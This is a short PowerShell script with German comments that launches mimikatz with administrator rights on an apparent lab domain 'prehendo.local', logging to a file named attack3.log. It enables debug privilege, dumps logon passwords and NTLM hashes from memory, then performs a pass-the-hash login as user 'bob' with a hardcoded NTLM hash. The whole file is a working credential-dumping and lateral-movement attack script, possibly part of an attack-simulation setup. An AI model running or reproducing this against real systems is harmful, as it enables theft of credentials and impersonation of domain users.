$process = "C:\prehendo\Tools\mimikatz\x64\mimikatz.exe" #Pfad der Mimikatz exe
$argument1 = "`"log C:\prehendo\Logs\attack3.log`"" #Pfad der Logdatei
$argument2 = "privilege::debug" #Privilegien setzten
$argument3 = "sekurlsa::logonpasswords" #NTLM Hashes hohlen
$argument4 = "`"sekurlsa::pth /user:bob /domain:prehendo.local /ntlm:0f208022007afc38c1fa841d45f0253c`""
$argument5 = "exit"

Start-Process $process -Verb runAs -ArgumentList $argument1, $argument2, $argument3, $argument4, $argument5